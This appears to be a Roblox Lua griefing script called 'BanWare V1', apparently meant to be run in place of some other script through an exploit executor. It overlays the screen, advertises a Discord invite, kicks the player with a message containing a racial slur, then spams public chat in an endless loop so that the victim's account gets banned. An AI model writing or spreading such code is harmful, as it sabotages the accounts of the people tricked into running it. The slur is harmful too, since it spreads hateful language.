-- cry

local gui = Instance.new("ScreenGui")
gui.Name = "ban ban ban ban ban"
gui.Parent = game.CoreGui
gui.ClipToDeviceSafeArea = false
gui.DisplayOrder = 99999999999999

local fr = Instance.new("Frame")
fr.Size = UDim2.new(1.1, 0, 1.1, 0)
fr.Position = UDim2.new(-0.1, 0, -0.1, 0)
fr.BackgroundColor3 = Color3.new(1, 1, 1)
fr.BorderColor3 = Color3.new(0, 0, 0)
fr.BorderSizePixel = 0
fr.Active = true
fr.BackgroundTransparency = 9
fr.Parent = gui

local label = Instance.new("TextLabel")
label.Size = UDim2.new(1, 0, 0.05, 0)
label.Position = UDim2.new(0, 0, 0, 0)
label.BackgroundColor3 = Color3.new(0, 0, 0)
label.BorderColor3 = Color3.new(0, 0, 0)
label.BorderSizePixel = 0
label.Text = "Bro Executed Wrong Script!"
label.TextColor3 = Color3.new(255, 255, 255)
label.BackgroundTransparency = 0
label.Font = "SourceSans"
label.TextScaled = true
label.Parent = fr

local function ssss()
wait(2)
label.Text = "BanWare V1 Executed"
wait(3)
label.Text = "Spamming Inappropriate Word Until you get 'Banned'"
wait(3)
label.Text = "join https://discord.gg/bqutC5VA !!"
wait(15)
game.Players.LocalPlayer:Kick("Fuck you nigga")
end

ssss()

local message = "#"
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local TextChatService = game:GetService("TextChatService")

while true do
    task.wait(0,7)  
    if TextChatService and TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
        local generalChannel = TextChatService:FindFirstChild("TextChannels") and TextChatService.TextChannels:FindFirstChild("RBXGeneral")
        if generalChannel then
            generalChannel:SendAsync(message)
        end
    end
    local chatEvents = ReplicatedStorage:FindFirstChild("DefaultChatSystemChatEvents")
    if chatEvents then
        local sayMessageRequest = chatEvents:FindFirstChild("SayMessageRequest")
        if sayMessageRequest then
            sayMessageRequest:FireServer(message, "All")
        end
    end
end
